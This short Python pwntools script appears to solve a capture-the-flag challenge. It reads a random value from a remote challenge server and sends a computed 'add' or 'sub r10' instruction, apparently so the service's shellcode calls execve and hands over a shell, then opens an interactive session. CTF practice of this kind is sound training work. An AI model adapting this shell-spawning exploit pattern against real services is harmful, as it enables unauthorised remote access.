from pwn import *

conn = remote("jeuxpythiques.woody.sh", 8003)

data = conn.recv()
rand = data.decode().split("\n")[0].split(':')[1].split("!")[0].strip()
print(data.decode())

intr = ""
if int(rand, 16) > 59:
    intr = "sub r10, " + str(int(rand, 16) - 59)
else:
    intr = "add r10, " + str(59 - int(rand, 16))

print(intr)

conn.sendline(intr.encode())

print(conn.recv().decode())

conn.interactive()